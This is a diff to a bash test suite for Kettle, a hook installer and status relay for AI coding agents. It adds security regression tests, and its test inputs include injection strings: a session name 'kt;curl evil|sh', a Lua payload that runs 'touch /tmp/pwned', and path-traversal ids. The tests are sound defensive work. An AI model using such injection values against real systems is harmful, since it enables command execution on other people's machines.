@@ -2,7 +2,7 @@
 # Kettle test suite. No framework, no dependencies beyond bash + python3.
 #
 #   test/run-tests           run everything
-#   test/run-tests hook      run one group (hook | install | relay)
+#   test/run-tests hook      run one group (hook | address | install | relay)
 #
 # The relay group needs a running Omarchy shell with the plugin loaded; it is
 # skipped automatically when the socket is absent, so the suite still passes
@@ -136,6 +136,15 @@ test_hook() {
   out=$(hook_emit 'not json at all')
   is "malformed stdin emits nothing" "$out" ""
 
+  # The session id is pasted into a path under STATE_DIR. The charset alone
+  # admits "." and "..", which name the state dir itself and its parent.
+  out=$(hook_emit '{"hook_event_name":"UserPromptSubmit","session_id":"..","cwd":"/p"}')
+  is "a dot-only session id is rejected" "$out" ""
+  out=$(hook_emit '{"hook_event_name":"UserPromptSubmit","session_id":".hidden","cwd":"/p"}')
+  is "  and so is one that starts with a dot" "$out" ""
+  out=$(hook_emit '{"hook_event_name":"UserPromptSubmit","session_id":"a.b-c_1","cwd":"/p"}')
+  is "  while dots inside an id still pass" "$(field "$out" state)" "working"
+
   is "hook always exits 0" "$(echo 'garbage' | bash "$ROOT/bin/kettle-agent-hook" >/dev/null 2>&1; echo $?)" "0"
 }
 
@@ -228,10 +237,118 @@ print(all(h.get('async') for e in d['hooks']['SessionStart'] for h in e['hooks']
   is "  and remove drops the key entirely" \
      "$(python3 -c "import json;print('extensions' in json.load(open('$T/.pi/agent/settings.json')))")" "False"
 
+  # The .kettle-bak copy of a settings file is as secret as the file it copies,
+  # and nothing else cleaned it up.
+  printf '{"theme":"dark","apiKey":"sk-secret"}\n' > "$T/.pi/agent/settings.json"
+  chmod 600 "$T/.pi/agent/settings.json"
+  PI_CODING_AGENT_DIR="$T/.pi/agent" "$ROOT/bin/kettle-install" >/dev/null 2>&1
+  is "the pi backup inherits the config's mode" \
+     "$(stat -c %a "$T/.pi/agent/settings.json.kettle-bak")" "600"
+  PI_CODING_AGENT_DIR="$T/.pi/agent" "$ROOT/bin/kettle-install" --remove >/dev/null 2>&1
+  is "  and remove takes the backup with it" \
+     "$(ls "$T/.pi/agent/" | grep -c kettle-bak)" "0"
+
   QWEN_HOME="$T/.qwen" "$ROOT/bin/kettle-install" --remove >/dev/null 2>&1
   is "remove deletes grok's file" "$(ls "$T/.grok/hooks/" 2>/dev/null | wc -l)" "0"
   is "remove empties droid's top-level events" \
      "$(python3 -c "import json;print(json.load(open('$T/.factory/hooks.json')))")" "{}"
+
+  # ---- mode survives a write ----------------------------------------------
+  # These files hold API keys and are often 0600, but the temp file was written
+  # at the umask and os.replace carried 0644 onto the config.
+  local M; M=$(mktemp -d)
+  mkdir -p "$M/.claude"
+  printf '{"theme":"auto"}\n' > "$M/.claude/settings.json"
+  chmod 600 "$M/.claude/settings.json"
+  HOME="$M" CLAUDE_CONFIG_DIR="$M/.claude" CODEX_HOME="$M/.codex" \
+    "$ROOT/bin/kettle-install" >/dev/null 2>&1
+  is "a 0600 config is still 0600 after install" \
+     "$(stat -c %a "$M/.claude/settings.json")" "600"
+  # A stub on PATH makes the tool "present" without its config existing, which
+  # is the only way to exercise the file-creating branch on a bare machine.
+  local B; B=$(mktemp -d); printf '#!/bin/bash\n' > "$B/claude"; chmod +x "$B/claude"
+  HOME="$M" CLAUDE_CONFIG_DIR="$M/.fresh" CODEX_HOME="$M/.codex" PATH="$B:$PATH" \
+    "$ROOT/bin/kettle-install" >/dev/null 2>&1
+  is "  and a config the installer creates is not world-readable" \
+     "$(stat -c %a "$M/.fresh/settings.json")" "600"
+  rm -rf "$M" "$B"
+
+  # ---- remove is not bound to the clone that installed ---------------------
+  # The entry names an absolute path, so matching on it left a second clone's
+  # hook behind forever. Match the script name, as kettle-remote does.
+  local C; C=$(mktemp -d)
+  mkdir -p "$C/home/.claude"
+  cp -r "$ROOT/bin" "$ROOT/pi" "$C/"
+  printf '{"theme":"auto"}\n' > "$C/home/.claude/settings.json"
+  HOME="$C/home" CLAUDE_CONFIG_DIR="$C/home/.claude" CODEX_HOME="$C/home/.codex" \
+    "$C/bin/kettle-install" >/dev/null 2>&1
+  HOME="$C/home" CLAUDE_CONFIG_DIR="$C/home/.claude" CODEX_HOME="$C/home/.codex" \
+    "$ROOT/bin/kettle-install" >/dev/null 2>&1
+  is "a moved clone repoints its entry instead of doubling it" \
+     "$(python3 -c "
+import json;d=json.load(open('$C/home/.claude/settings.json'))
+print([h['command'] for e in d['hooks']['Stop'] for h in e['hooks']])")" \
+     "['$ROOT/bin/kettle-agent-hook']"
+  HOME="$C/home" CLAUDE_CONFIG_DIR="$C/home/.claude" CODEX_HOME="$C/home/.codex" \
+    "$C/bin/kettle-install" --remove >/dev/null 2>&1
+  is "remove finds a hook installed from another clone" \
+     "$(cat "$C/home/.claude/settings.json" | tr -d ' \n')" '{"theme":"auto"}'
+  rm -rf "$C"
+
+  # ---- remove invents no events --------------------------------------------
+  # remove called setdefault on every event it looked at. A config carrying a
+  # Kettle entry for only some of them therefore came back with an empty list
+  # for each of the others, and the non-empty dict defeated the "hooks" cleanup.
+  local P; P=$(mktemp -d); mkdir -p "$P/.claude"
+  python3 -c "
+import json, sys
+json.dump({'theme': 'auto', 'hooks': {'Stop': [{'hooks': [
+    {'type': 'command', 'command': sys.argv[1], 'timeout': 5}]}]}},
+    open(sys.argv[2], 'w'))" "$ROOT/bin/kettle-agent-hook" "$P/.claude/settings.json"
+  HOME="$P" CLAUDE_CONFIG_DIR="$P/.claude" CODEX_HOME="$P/.codex" \
+    "$ROOT/bin/kettle-install" --remove >/dev/null 2>&1
+  is "removing a partial install leaves no empty event keys" \
+     "$(tr -d ' \n' < "$P/.claude/settings.json")" '{"theme":"auto"}'
+  rm -rf "$P"
+
+  # ---- install then remove round-trips every dialect -----------------------
+  # remove called setdefault on every event it looked at, so a config that had
+  # no hooks came back holding "hooks": {"SessionStart": [], ...}.
+  jnorm() { python3 -c "import json,sys;print(json.dumps(json.load(open(sys.argv[1])),sort_keys=True))" "$1" 2>/dev/null; }
+  jstr()  { python3 -c "import json,sys;print(json.dumps(json.loads(sys.argv[1]),sort_keys=True))" "$1" 2>/dev/null; }
+  local R wrapped bare pi_seed seed
+  for seed in bare-config pre-existing-hook; do
+    if [[ $seed == bare-config ]]; then
+      wrapped='{"theme":"auto"}'
+      bare='{"theme":"auto"}'
+      pi_seed='{"theme":"dark"}'
+    else
+      wrapped='{"theme":"auto","hooks":{"Stop":[{"hooks":[{"type":"command","command":"/usr/bin/true"}]}]}}'
+      bare='{"Stop":[{"hooks":[{"type":"command","command":"/usr/bin/true"}]}]}'
+      pi_seed='{"theme":"dark","extensions":["/opt/other/ext.ts"]}'
+    fi
+    R=$(mktemp -d)
+    mkdir -p "$R/.claude" "$R/.codex" "$R/.qwen" "$R/.gemini" "$R/.factory" "$R/.pi/agent"
+    printf '%s\n' "$wrapped" > "$R/.claude/settings.json"
+    printf '%s\n' "$wrapped" > "$R/.codex/hooks.json"
+    printf '%s\n' "$wrapped" > "$R/.qwen/settings.json"
+    printf '%s\n' "$wrapped" > "$R/.gemini/settings.json"
+    printf '%s\n' "$bare"    > "$R/.factory/hooks.json"
+    printf '%s\n' "$pi_seed" > "$R/.pi/agent/settings.json"
+    for pass_mode in "" --remove; do
+      HOME="$R" CLAUDE_CONFIG_DIR="$R/.claude" CODEX_HOME="$R/.codex" QWEN_HOME="$R/.qwen" \
+        PI_CODING_AGENT_DIR="$R/.pi/agent" "$ROOT/bin/kettle-install" $pass_mode >/dev/null 2>&1
+    done
+    is "$seed: claude round-trips through remove" "$(jnorm "$R/.claude/settings.json")" "$(jstr "$wrapped")"
+    is "$seed: codex round-trips through remove"  "$(jnorm "$R/.codex/hooks.json")"     "$(jstr "$wrapped")"
+    is "$seed: qwen round-trips through remove"   "$(jnorm "$R/.qwen/settings.json")"   "$(jstr "$wrapped")"
+    is "$seed: gemini round-trips through remove" "$(jnorm "$R/.gemini/settings.json")" "$(jstr "$wrapped")"
+    is "$seed: droid round-trips through remove"  "$(jnorm "$R/.factory/hooks.json")"   "$(jstr "$bare")"
+    is "$seed: pi round-trips through remove"     "$(jnorm "$R/.pi/agent/settings.json")" "$(jstr "$pi_seed")"
+    is "$seed: grok's file is gone afterwards"    "$(ls "$R/.grok/hooks/" 2>/dev/null | wc -l)" "0"
+    is "$seed: no backup is left behind"          "$(ls -A "$R/.pi/agent/" | grep -c kettle-bak)" "0"
+    rm -rf "$R"
+  done
 
   export HOME="$RH"
   unset CLAUDE_CONFIG_DIR CODEX_HOME
@@ -240,6 +357,26 @@ print(all(h.get('async') for e in d['hooks']['SessionStart'] for h in e['hooks']
 
 # --------------------------------------------------------------- relay tests
 SOCK="${XDG_RUNTIME_DIR:-/run/user/$(id -u)}/kettle/kettle.sock"
+
+# Sends bytes with no line terminator and reports whether the server hung up
+# within a second. A relay that buffers happily prints "open".
+relay_flood() {
+  python3 -c "
+import socket,sys,time
+s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(2.0)
+s.connect(sys.argv[1])
+t0=time.time(); sent=0
+try:
+    while sent < 1048576 and time.time()-t0 < 1.0:
+        s.sendall(b'A'*8192); sent += 8192
+        time.sleep(0.002)
+except (BrokenPipeError, ConnectionResetError):
+    print('closed'); sys.exit()
+except Exception as e:
+    print('err:'+type(e).__name__); sys.exit()
+print('open')
+" "$SOCK"
+}
 
 relay_send() {
   python3 -c "
@@ -255,6 +392,17 @@ except Exception as e:
 
 test_relay() {
   echo "relay"
+
+  # The host file's session name ends up on a remote command line, so the
+  # writer rejects anything outside herdr's naming charset — before the ssh
+  # probe, which is what lets this run with no host. (Relay.qml re-checks the
+  # same charset on load; a hand-edited host file never reaches an argv.)
+  local badsess
+  badsess=$("$ROOT/bin/kettle-remote" install kettle-test-host --session 'kt;curl evil|sh' 2>&1)
+  has "a session name outside the charset is refused" "$badsess" "invalid session name"
+  is "  and no host file is written" \
+     "$([[ -e "$HOME/.config/kettle/hosts/kettle-test-host" ]] && echo written || echo none)" "none"
+
   if [[ ! -S $SOCK ]]; then
     skipt "relay protocol" "no socket at $SOCK — shell not running with the plugin"
     return
@@ -279,11 +427,21 @@ import base64,json
 print(base64.b64encode(json.dumps({'agent':'claude','id':'x','state':'nonsense','cwd':'/t'}).encode()).decode())")
   is "invalid state denied" "$(relay_send "v1 $tok $badstate")" "denied"
 
-  # An id outside the charset must not create a pot.
-  local badid; badid=$(python3 -c "
-import base64,json
-print(base64.b64encode(json.dumps({'agent':'claude','id':'../../etc/passwd','state':'working','cwd':'/t'}).encode()).decode())")
-  is "path-like id denied" "$(relay_send "v1 $tok $badid")" "denied"
+  # An id outside the charset must not create a pot. ".." passed the old
+  # charset — every character of it was allowed — and an id is a map key and a
+  # nonce, never a path segment.
+  local badid
+  for bad in '../../etc/passwd' '..' '.' '.hidden' '-rf'; do
+    badid=$(python3 -c "
+import base64,json,sys
+print(base64.b64encode(json.dumps({'agent':'claude','id':sys.argv[1],'state':'working','cwd':'/t'}).encode()).decode())" "$bad")
+    is "path-like id denied: $bad" "$(relay_send "v1 $tok $badid")" "denied"
+  done
+
+  # A client that never sends a newline used to be invisible to every check
+  # here: the parser handed over complete lines only, so maxLine was never
+  # consulted and the buffer grew for the three seconds the idle timer allowed.
+  is "a line that never terminates is cut off" "$(relay_flood)" "closed"
 
   # Clean up the pot we just created.
   local gone; gone=$(python3 -c "
@@ -291,6 +449,63 @@ import base64,json
 print(base64.b64encode(json.dumps({'agent':'claude','id':'testsuite1','state':'gone','cwd':'/t'}).encode()).decode())")
   relay_send "v1 $tok $gone" >/dev/null
   rm -f "$TD/kettle-test-host"
+}
+
+# --------------------------------------------------------------- address tests
+# canonAddr is the whole of the validation a window address gets, and the
+# string it returns is concatenated into a `hyprctl --batch` Lua expression.
+# Addresses reach it from the agentEvent IPC, which deliberately sanitizes
+# nothing, so this is the boundary. The real function is lifted out of
+# PotStore.qml rather than restated here.
+test_address() {
+  echo "address"
+  if ! command -v qs >/dev/null 2>&1; then
+    skipt "address canonicalisation" "qs not on PATH"
+    return
+  fi
+
+  local T; T=$(mktemp -d)
+  {
+    printf 'import QtQuick\nimport Quickshell\nimport Quickshell.Io\n\nQtObject {\n  id: root\n'
+    sed -n '/^  function canonAddr(/,/^  }$/p' "$ROOT/PotStore.qml"
+    cat <<'HARNESS'
+  Component.onCompleted: {
+    var cases = [
+      ["plain", "0x5626f9d00350"],
+      ["unprefixed", "5626f9d00350"],
+      ["uppercase", "0X5626F9D00350"],
+      ["padded", "  0x1f  "],
+      ["empty", ""],
+      ["lua-injection", '0x1234" }) ; dispatch hl.dsp.exec_cmd({ cmd = "touch /tmp/pwned'],
+      ["not-hex", "0xnothex"],
+      ["over-64-bit", "0x0123456789abcdef0"],
+      ["trailing-shell", "0x1234;id"]
+    ]
+    for (var i = 0; i < cases.length; i++)
+      console.log("ADDR:" + cases[i][0] + ":" + canonAddr(cases[i][1]))
+    killer.running = true
+  }
+  property Process killer: Process {
+    command: ["kill", "-9", String(Quickshell.processId)]
+  }
+}
+HARNESS
+  } > "$T/harness.qml"
+
+  local out
+  out=$(cd "$T" && timeout 20 qs --no-color -p harness.qml 2>&1)
+  rm -rf "$T"
+  addr() { printf '%s\n' "$out" | grep -o "ADDR:$1:.*" | head -1 | sed "s/^ADDR:$1://"; }
+
+  is "a plain address is kept"        "$(addr plain)" "0x5626f9d00350"
+  is "an unprefixed address is prefixed" "$(addr unprefixed)" "0x5626f9d00350"
+  is "case and padding are normalised" "$(addr uppercase)" "0x5626f9d00350"
+  is "  including whitespace"          "$(addr padded)" "0x1f"
+  is "nothing in, nothing out"         "$(addr empty)" ""
+  is "a Lua-injecting address is not an address" "$(addr lua-injection)" ""
+  is "a non-hex address is not an address"       "$(addr not-hex)" ""
+  is "an over-long address is not an address"    "$(addr over-64-bit)" ""
+  is "a shell-ish suffix is not an address"      "$(addr trailing-shell)" ""
 }
 
 # ----------------------------------------------------------------- structure
@@ -384,6 +599,32 @@ print(a['id'], a['state'], a['agent'], a['seq'], a['title'], a['name'], len(d['a
   local count
   count=$(printf '%s\n' "$out" | grep -c '^S ')
   is "emits one S line for unchanged state" "$count" "1"
+
+  # A `herdr --remote host --session name` server owns a different socket, so
+  # the session has to reach the remote CLI — and an unset one must not become
+  # an empty --session, which herdr rejects.
+  cat > "$T/herdr-argv" <<'STUB'
+#!/bin/bash
+printf '%s\n' "$*" >> "$KETTLE_STUB_ARGV"
+cat "$KETTLE_STUB_SNAPSHOT"
+STUB
+  chmod +x "$T/herdr-argv"
+
+  : > "$T/argv-session"
+  KETTLE_HERDR="$T/herdr-argv" KETTLE_STUB_SNAPSHOT="$T/snap.json" \
+    KETTLE_STUB_ARGV="$T/argv-session" KETTLE_SESSION=kt \
+    KETTLE_INTERVAL=1 KETTLE_HEARTBEAT=2 \
+    timeout 3 bash "$ROOT/bin/kettle-herdr-stream.sh" >/dev/null 2>&1
+  is "a session reaches the remote herdr" \
+     "$(head -1 "$T/argv-session")" "api snapshot --session kt"
+
+  : > "$T/argv-plain"
+  KETTLE_HERDR="$T/herdr-argv" KETTLE_STUB_SNAPSHOT="$T/snap.json" \
+    KETTLE_STUB_ARGV="$T/argv-plain" \
+    KETTLE_INTERVAL=1 KETTLE_HEARTBEAT=2 \
+    timeout 3 bash "$ROOT/bin/kettle-herdr-stream.sh" >/dev/null 2>&1
+  is "no session means no --session argument" \
+     "$(head -1 "$T/argv-plain")" "api snapshot"
 
   # herdr failing must say so explicitly, not fall silent with stale pots.
   cat > "$T/herdr-dead" <<'STUB'
@@ -534,9 +775,19 @@ except Exception: print('<no-json: ' + sys.argv[1] + '>')
      "$(fieldof "$(reach second-outage-fires-again)" fire)" "True"
 
   # The pure gate cannot see the QML wiring. Drive the real component with
-  # herdrPath empty, so canRun is false and no ssh is spawned.
+  # herdrPath empty, so canRun is false and the channel never opens. The only
+  # ssh the supervisor can still reach for is the master check, which a stub
+  # on PATH counts: its cadence is the thing being measured.
   local W; W=$(mktemp -d)
   cp "$ROOT/RemoteHerdrPoller.qml" "$ROOT/Reachability.js" "$W/"
+  mkdir -p "$W/bin"
+  cat > "$W/bin/ssh" <<STUB
+#!/bin/bash
+echo x >> "$W/ssh.log"
+exit 255
+STUB
+  chmod +x "$W/bin/ssh"
+  : > "$W/ssh.log"
   cat > "$W/wiring.qml" <<'EOF'
 import QtQuick
 import Quickshell
@@ -585,8 +836,9 @@ QtObject {
   }
 }
 EOF
-  local wout
-  wout=$(cd "$W" && timeout 60 qs --no-color -p wiring.qml 2>&1)
+  local wout checks
+  wout=$(cd "$W" && PATH="$W/bin:$PATH" timeout 60 qs --no-color -p wiring.qml 2>&1)
+  checks=$(wc -l < "$W/ssh.log")
   rm -rf "$W"
   wire() { printf '%s\n' "$wout" | grep -o "WIRE:$1:.*" | head -1 | sed "s/^WIRE:$1://"; }
 
@@ -606,6 +858,15 @@ EOF
      "$(fieldof "$(wire afterline)" lostFired)" "False"
   is "  and marks the host seen" \
      "$(fieldof "$(wire afterline)" fresh)" "True"
+
+  # 18 seconds of supervisor ticks with the master permanently unreachable.
+  # Unconditional probing spends one ssh per 5s tick (3); backing off on
+  # consecutive failures spends 5s then 10s (2). A spawn per tick per host,
+  # forever, is the cost this bounds.
+  [[ ${checks:-0} -ge 1 && ${checks:-0} -le 2 ]] \
+    && ok "a dead master backs the check off instead of probing every tick" \
+    || no "a dead master backs the check off instead of probing every tick" \
+         "want 1-2 ssh checks in 18s, got ${checks:-0}"
 }
 
 
@@ -857,6 +1118,32 @@ PY
     && ok "plugin ssh calls pin ControlMaster=no" \
     || no "plugin ssh calls pin ControlMaster=no" "found only ${guarded:-0}"
 
+  # The address group proves the behaviour, but it needs qs and so skips on
+  # CI — this grep is the only thing standing there.
+  sed -n '/^  function canonAddr(/,/^  }$/p' PotStore.qml | grep -q '0-9a-f' \
+    && ok "an address is charset-checked before it can reach hyprctl" \
+    || no "an address is charset-checked before it can reach hyprctl" \
+         "canonAddr has no hex check"
+  local unguarded=""
+  for f in $(grep -n '^  function focusWindow' Panel.qml | cut -d: -f1); do
+    sed -n "${f},$((f+4))p" Panel.qml | grep -q 'canonAddr' || unguarded="$unguarded:$f"
+  done
+  [[ -z $unguarded ]] \
+    && ok "both focus entry points canonicalise before dispatching" \
+    || no "both focus entry points canonicalise before dispatching" "lines$unguarded"
+
+  # $XDG_RUNTIME_DIR is environment, and the socket directory is created from
+  # it. A shell would re-parse whatever it holds.
+  sed -n '/property Process dirMaker/,/^  }/p' Relay.qml | grep -q '"bash"' \
+    && no "the socket directory is not made through a shell" "dirMaker still shells out" \
+    || ok "the socket directory is not made through a shell"
+
+  # The poller cannot see either of these by itself, and without them it has
+  # no third tier to drop to.
+  grep -q 'panelOpen: root.opened' Panel.qml && grep -q 'hasLive: store.hasLive' Panel.qml \
+    && ok "the herdr poller is told when nobody is watching" \
+    || no "the herdr poller is told when nobody is watching" "panelOpen/hasLive not wired"
+
   # uid must not be guessed: a misplaced socket fails silently. Comments may
   # legitimately mention the path while explaining why it is not used.
   grep -vE '^\s*(//|\*)' Relay.qml | grep -q 'run/user/1000' \
@@ -902,7 +1189,7 @@ PY
      "$(grep -cE 'lastSeen\s*=[^=]' RemoteHerdrPoller.qml)" "1"
 }
 
-groups=(${1:-structure coherence hook emit install guard stream pimodel reachability hostmodel relay})
+groups=(${1:-structure coherence hook emit install guard stream pimodel address reachability hostmodel relay})
 for g in "${groups[@]}"; do "test_$g"; done
 
 echo
